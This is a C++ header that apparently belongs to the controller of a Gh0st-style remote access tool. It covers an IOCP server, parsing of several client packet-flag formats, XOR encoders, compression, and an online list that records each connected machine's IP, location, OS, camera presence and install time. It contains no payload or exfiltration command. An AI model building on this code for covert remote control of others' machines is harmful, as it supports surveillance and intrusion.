#pragma once

#include "StdAfx.h"
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#include "CpuUseage.h"
#include "Buffer.h"
#define XXH_INLINE_ALL
#include "xxhash.h"

#if USING_CTX
#include "zstd/zstd.h"
#endif

#include <Mstcpip.h>
#include "common/header.h"
#include "common/encrypt.h"
#define PACKET_LENGTH   0x2000

#define	NC_CLIENT_CONNECT		0x0001
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // 完整接收

std::string GetPeerName(SOCKET sock);
std::string GetRemoteIP(SOCKET sock);


enum
{
	ONLINELIST_IP = 0,          // IP的列顺序
	ONLINELIST_ADDR,            // 地址
	ONLINELIST_LOCATION,        // 地理位置
	ONLINELIST_COMPUTER_NAME,   // 计算机名/备注
	ONLINELIST_OS,              // 操作系统
	ONLINELIST_CPU,             // CPU
	ONLINELIST_VIDEO,           // 摄像头(有无)
	ONLINELIST_PING,            // PING(对方的网速)
	ONLINELIST_VERSION,	        // 版本信息
	ONLINELIST_INSTALLTIME,     // 安装时间
	ONLINELIST_LOGINTIME,       // 活动窗口
	ONLINELIST_CLIENTTYPE,		// 客户端类型
	ONLINELIST_PATH,			// 文件路径
	ONLINELIST_MAX,
};

enum {
	PARSER_WINOS = -2,
	PARSER_FAILED = -1,			// 解析失败
	PARSER_NEEDMORE = 0,		// 需要更多数据
};

typedef struct PR {
	int Result;
	bool IsFailed() const {
		return PARSER_FAILED == Result;
	}
	bool IsNeedMore() const {
		return PARSER_NEEDMORE == Result;
	}
	bool IsWinOSLogin() const {
		return PARSER_WINOS == Result;
	}
}PR;

enum {
	COMPRESS_UNKNOWN = -2,			// 未知压缩算法
	COMPRESS_ZLIB = -1,				// 以前版本使用的压缩方法
	COMPRESS_ZSTD = 0,				// 当前使用的压缩方法
	COMPRESS_NONE = 1,				// 没有压缩
};

struct CONTEXT_OBJECT;

// Header parser: parse the data to make sure it's from a supported client.
class HeaderParser {
	friend struct CONTEXT_OBJECT;
protected:
	HeaderParser() {
		memset(this, 0, sizeof(HeaderParser));
	}
	virtual ~HeaderParser() {
		Reset();
	}
	PR Parse(CBuffer& buf, int &compressMethod) {
		const int MinimumCount = MIN_COMLEN;
		if (buf.GetBufferLength() < MinimumCount) {
			return PR{ PARSER_NEEDMORE };
		}
		char szPacketFlag[32] = { 0 };
		buf.CopyBuffer(szPacketFlag, MinimumCount, 0);
		HeaderEncType encTyp = HeaderEncUnknown;
		FlagType flagType = CheckHead(szPacketFlag, encTyp);
		if (flagType == FLAG_UNKNOWN) {
			// 数据长度 + 通信密码 [4字节启动时间+4个0字节+命令标识+系统位数标识]
			const BYTE* ptr = (BYTE*)buf.GetBuffer(0), *p = ptr+4;
			int length = *((int*)ptr);
			int excepted = buf.GetBufferLength();
			if (length == excepted && length == 16 && p[4] == 0 && p[5] == 0 && 
				p[6] == 0&& p[7] == 0 && p[8] == 202 && (p[9] == 0 || p[9] == 1)) {
				m_nFlagType = FLAG_WINOS;
				compressMethod = COMPRESS_NONE;
				memcpy(m_szPacketFlag, p, 10); // 通信密码
				m_nCompareLen = 0;
				m_nFlagLen = 0;
				m_nHeaderLen = 14;
				m_bParsed = TRUE;
				m_Encoder = new Encoder();
				m_Encoder2 = new WinOsEncoder();
				return PR{ PARSER_WINOS };
			}
			return PR{ PARSER_FAILED };
		}
		if (m_bParsed) { // Check if the header has been parsed.
			return memcmp(m_szPacketFlag, szPacketFlag, m_nCompareLen) == 0 ? PR{ m_nFlagLen } : PR{ PARSER_FAILED };
		}
		// More version may be added in the future.
		switch (m_nFlagType = flagType)
		{
		case FLAG_UNKNOWN:
			return PR{ PARSER_FAILED };
		case FLAG_SHINE:
			memcpy(m_szPacketFlag, szPacketFlag, 5);
			m_nCompareLen = 5;
			m_nFlagLen = m_nCompareLen;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new Encoder();
			m_Encoder2 = new Encoder();
			break;
		case FLAG_FUCK:
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = 8;
			m_nFlagLen = m_nCompareLen + 3;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new XOREncoder();
			m_Encoder2 = new Encoder();
			break;
		case FLAG_HELLO:
			// This header is only for handling SOCKET_DLLLOADER command
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = 6;
			m_nFlagLen = 8;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			compressMethod = COMPRESS_NONE;
			m_Encoder = new Encoder();
			m_Encoder2 = new XOREncoder16();
			break;
		case FLAG_HELL:
			// This version
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = FLAG_COMPLEN;
			m_nFlagLen = FLAG_LENGTH;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new Encoder();
			m_Encoder2 = new XOREncoder16();
			break;
		default:
			break;
		}
		return PR{ m_nFlagLen };
	}
	BOOL IsEncodeHeader() const {
		return m_nFlagType == FLAG_HELLO || m_nFlagType == FLAG_HELL;
	}
	HeaderParser& Reset() {
		SAFE_DELETE(m_Encoder);
		SAFE_DELETE(m_Encoder2);
		memset(this, 0, sizeof(HeaderParser));
		return *this;
	}
	BOOL IsParsed() const {
		return m_bParsed;
	}
	int GetFlagLen() const {
		return m_nFlagLen;
	}
	int GetHeaderLen() const {
		return m_nHeaderLen;
	}
	const char* GetFlag() const {
		return m_szPacketFlag;
	}
	FlagType GetFlagType() const {
		return m_nFlagType;
	}
	Encoder* GetEncoder() const {
		return m_Encoder;
	}
	Encoder* GetEncoder2() const {
		return m_Encoder2;
	}
private:
	BOOL				m_bParsed;					// 数据包是否可以解析
	int					m_nHeaderLen;				// 数据包的头长度
	int					m_nCompareLen;				// 比对字节数
	int					m_nFlagLen;					// 标识长度
	FlagType			m_nFlagType;				// 标识类型
	char				m_szPacketFlag[32];			// 对比信息
	Encoder*			m_Encoder;					// 编码器
	Encoder*			m_Encoder2;					// 编码器2
};

enum IOType 
{
	IOInitialize,
	IORead,
	IOWrite,   
	IOIdle
};

typedef struct CONTEXT_OBJECT 
{
	CString  sClientInfo[ONLINELIST_MAX];
	CString  additonalInfo[RES_MAX];
	SOCKET   sClientSocket;
	WSABUF   wsaInBuf;
	WSABUF	 wsaOutBuffer;  
	char     szBuffer[PACKET_LENGTH];
	CBuffer				InCompressedBuffer;	        // 接收到的压缩的数据
	CBuffer				InDeCompressedBuffer;	    // 解压后的数据
	CBuffer             OutCompressedBuffer;
	int				    v1;
	HANDLE              hDlg;
	void				*olps;						// OVERLAPPEDPLUS
	int					CompressMethod;				// 压缩算法
	HeaderParser		Parser;						// 解析数据协议
	uint64_t			ID;							// 唯一标识

	BOOL				m_bProxyConnected;			// 代理是否连接
	BOOL 				bLogin;						// 是否 login
	std::string			PeerName;					// 对端IP

	VOID InitMember(SOCKET s)
	{
		memset(szBuffer, 0, sizeof(char) * PACKET_LENGTH);
		v1 = 0;
		hDlg = NULL;
		sClientSocket = s;
		PeerName = ::GetPeerName(sClientSocket);
		memset(&wsaInBuf, 0, sizeof(WSABUF));
		memset(&wsaOutBuffer, 0, sizeof(WSABUF));
		olps = NULL;
		for (int i = 0; i < ONLINELIST_MAX; i++) {
			sClientInfo[i].Empty();
		}
		for (int i = 0; i < RES_MAX; i++) {
			additonalInfo[i].Empty();
		}
		CompressMethod = COMPRESS_ZSTD;
		Parser.Reset();
		bLogin = FALSE;
		m_bProxyConnected = FALSE;
	}
	VOID SetClientInfo(const CString(&s)[ONLINELIST_MAX], const std::vector<std::string>& a = {}) {
		for (int i = 0; i < ONLINELIST_MAX; i++)
		{
			sClientInfo[i] = s[i];
		}
		for (int i = 0; i < a.size(); i++) {
			additonalInfo[i] = a[i].c_str();
		}
	}
	PBYTE GetBuffer(int offset) {
		return InDeCompressedBuffer.GetBuffer(offset);
	}
	ULONG GetBufferLength() {
		return InDeCompressedBuffer.GetBufferLength();
	}
	std::string GetPeerName() const {
		return PeerName;
	}
	CString GetClientData(int index) const{
		return sClientInfo[index];
	}
	void GetAdditionalData(CString(&s)[RES_MAX]) const {
		for (int i = 0; i < RES_MAX; i++)
		{
			s[i] = additonalInfo[i];
		}
	}
	void CancelIO() {
		SAFE_CANCELIO(sClientSocket);
	}
	BOOL CopyBuffer(PVOID pDst, ULONG nLen, ULONG ulPos) {
		return InDeCompressedBuffer.CopyBuffer(pDst, nLen, ulPos);
	}
	BYTE GetBYTE(int offset) {
		return InDeCompressedBuffer.GetBYTE(offset);
	}
	// Write compressed buffer.
	void WriteBuffer(LPBYTE data, ULONG dataLen, ULONG originLen) {
		if (Parser.IsParsed()) {
			ULONG totalLen = dataLen + Parser.GetHeaderLen();
			BYTE szPacketFlag[32] = {};
			const int flagLen = Parser.GetFlagLen();
			memcpy(szPacketFlag, Parser.GetFlag(), flagLen);
			if (Parser.IsEncodeHeader())
				encrypt(szPacketFlag, FLAG_COMPLEN, szPacketFlag[flagLen - 2]);
			OutCompressedBuffer.WriteBuffer((LPBYTE)szPacketFlag, flagLen);
			OutCompressedBuffer.WriteBuffer((PBYTE)&totalLen, sizeof(ULONG));
			if (Parser.GetFlagType() == FLAG_WINOS) {
				memcpy(szPacketFlag, Parser.GetFlag(), 10);
				OutCompressedBuffer.WriteBuffer((PBYTE)Parser.GetFlag(), 10);
			}else {
				OutCompressedBuffer.WriteBuffer((PBYTE)&originLen, sizeof(ULONG));
				InDeCompressedBuffer.CopyBuffer(szPacketFlag + flagLen, 16, 16);
			}
			Encode2(data, dataLen, szPacketFlag);
			OutCompressedBuffer.WriteBuffer(data, dataLen);
		}
	}
	// Read compressed buffer.
	PBYTE ReadBuffer(ULONG &dataLen, ULONG &originLen) {
		if (Parser.IsParsed()) {
			ULONG totalLen = 0;
			BYTE szPacketFlag[32] = {};
			InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, Parser.GetFlagLen());
			InCompressedBuffer.ReadBuffer((PBYTE)&totalLen, sizeof(ULONG));
			if (Parser.GetFlagType() == FLAG_WINOS) {
				InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, 10);
			} else {
				InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
			}
			dataLen = totalLen - Parser.GetHeaderLen();
			PBYTE CompressedBuffer = new BYTE[dataLen];
			InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
			Decode2(CompressedBuffer, dataLen, szPacketFlag);
			return CompressedBuffer;
		}
		return nullptr;
	}
	// Parse the data to make sure it's from a supported client. The length of `Header Flag` will be returned.
	PR Parse(CBuffer& buf) {
		return Parser.Parse(buf, CompressMethod);
	}
	// Encode data before compress.
	void Encode(PBYTE data, int len) const {
		Parser.GetEncoder()->Encode((unsigned char*)data, len);
	}
	// Decode data after uncompress.
	void Decode(PBYTE data, int len) const {
		Parser.GetEncoder()->Decode((unsigned char*)data, len);
	}
	// Encode data after compress.
	void Encode2(PBYTE data, int len, PBYTE param) const {
		Parser.GetEncoder2()->Encode((unsigned char*)data, len, param);
	}
	// Decode data before uncompress.
	void Decode2(PBYTE data, int len, PBYTE param) const {
		Parser.GetEncoder2()->Decode((unsigned char*)data, len, param);
	}
	std::string RemoteAddr() const {
		sockaddr_in  ClientAddr = {};
		int ulClientAddrLen = sizeof(sockaddr_in);
		int s = getpeername(sClientSocket, (SOCKADDR*)&ClientAddr, &ulClientAddrLen);
		return s != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";
	}
	static uint64_t CalculateID(const CString(&data)[ONLINELIST_MAX]) {
		int idx[] = { ONLINELIST_IP, ONLINELIST_COMPUTER_NAME, ONLINELIST_OS, ONLINELIST_CPU, ONLINELIST_PATH, };
		CString s;
		for (int i = 0; i < 5; i++) {
			s += data[idx[i]] + "|";
		}
		s.Delete(s.GetLength() - 1);
		return XXH64(s.GetString(), s.GetLength(), 0);
	}
	uint64_t GetID() const { return ID; }
	void SetID(uint64_t id) { ID = id; }
}CONTEXT_OBJECT,*PCONTEXT_OBJECT;

typedef CList<PCONTEXT_OBJECT> ContextObjectList;

class IOCPServer
{
public:
	SOCKET    m_sListenSocket;
	HANDLE    m_hCompletionPort;
	UINT      m_ulMaxConnections;          // 最大连接数
	HANDLE    m_hListenEvent;
	HANDLE    m_hListenThread;
	BOOL      m_bTimeToKill;
	HANDLE    m_hKillEvent;

	ULONG m_ulThreadPoolMin;
	ULONG m_ulThreadPoolMax;
	ULONG m_ulCPULowThreadsHold; 
	ULONG m_ulCPUHighThreadsHold;
	ULONG m_ulCurrentThread;
	ULONG m_ulBusyThread;

#if USING_CTX
	ZSTD_CCtx* m_Cctx; // 压缩上下文
	ZSTD_DCtx* m_Dctx; // 解压上下文
#endif

	CCpuUsage m_cpu;

	ULONG  m_ulKeepLiveTime;

	typedef void (CALLBACK *pfnNotifyProc)(CONTEXT_OBJECT* ContextObject);
	typedef void (CALLBACK *pfnOfflineProc)(CONTEXT_OBJECT* ContextObject);
	UINT StartServer(pfnNotifyProc NotifyProc, pfnOfflineProc OffProc, USHORT uPort);

	static DWORD WINAPI ListenThreadProc(LPVOID lParam);
	BOOL InitializeIOCP(VOID);
	static DWORD WINAPI WorkThreadProc(LPVOID lParam);
	ULONG   m_ulWorkThreadCount;
	VOID OnAccept();
	CRITICAL_SECTION m_cs;

	/************************************************************************/
	//上下背景文对象
	ContextObjectList				m_ContextConnectionList;
	ContextObjectList               m_ContextFreePoolList;
	PCONTEXT_OBJECT AllocateContext(SOCKET s);
	VOID RemoveStaleContext(CONTEXT_OBJECT* ContextObject);
	VOID MoveContextToFreePoolList(CONTEXT_OBJECT* ContextObject);

	VOID PostRecv(CONTEXT_OBJECT* ContextObject);

	int AddWorkThread(int n) { 
		EnterCriticalSection(&m_cs); 
		m_ulWorkThreadCount += n;
		int ret = m_ulWorkThreadCount;
		LeaveCriticalSection(&m_cs);
		return ret;
	}

	/************************************************************************/
	//请求得到完成
	BOOL HandleIO(IOType PacketFlags,PCONTEXT_OBJECT ContextObject, DWORD dwTrans);
	BOOL OnClientInitializing(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans);
	BOOL OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans);  
	VOID OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer , size_t ulOriginalLength);
	VOID Send(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) {
		OnClientPreSending(ContextObject, szBuffer, ulOriginalLength);
	}
	VOID Send2Client(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) {
		OnClientPreSending(ContextObject, szBuffer, ulOriginalLength);
	}
	BOOL OnClientPostSending(CONTEXT_OBJECT* ContextObject,ULONG ulCompressedLength);
	void UpdateMaxConnection(int maxConn);
	IOCPServer(void);
	~IOCPServer(void);
	void Destroy();
	void Disconnect(CONTEXT_OBJECT *ctx){}
	pfnNotifyProc m_NotifyProc;
	pfnOfflineProc m_OfflineProc;
};

typedef IOCPServer ISocketBase;

#define TRACK_OVERLAPPEDPLUS 0

class OVERLAPPEDPLUS   
{
public:

	OVERLAPPED			m_ol;    
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType)
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [new] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}

	~OVERLAPPEDPLUS()
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [delete] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
	}
};

typedef IOCPServer CIOCPServer;

typedef CONTEXT_OBJECT ClientContext;

#define m_Socket sClientSocket
#define m_DeCompressionBuffer InDeCompressedBuffer

// 所有动态创建的对话框的基类
class CDialogBase : public CDialog {
public:
	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsClosed;
	HICON m_hIcon;
	CDialogBase(UINT nIDTemplate, CWnd* pParent, IOCPServer* pIOCPServer, CONTEXT_OBJECT* pContext, int nIcon) :
		m_bIsClosed(false),
		m_ContextObject(pContext),
		m_iocpServer(pIOCPServer),
		CDialog(nIDTemplate, pParent) {

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockaddr_in);
		BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

		m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		m_hIcon = nIcon > 0 ? LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(nIcon)) : NULL;
	}

public:
	virtual void OnReceiveComplete(void) = 0;
	void OnClose() {
		CDialog::OnClose();
		m_bIsClosed = true;
#if CLOSE_DELETE_DLG
		delete this;
#endif
	}
};

typedef CDialogBase DialogBase;
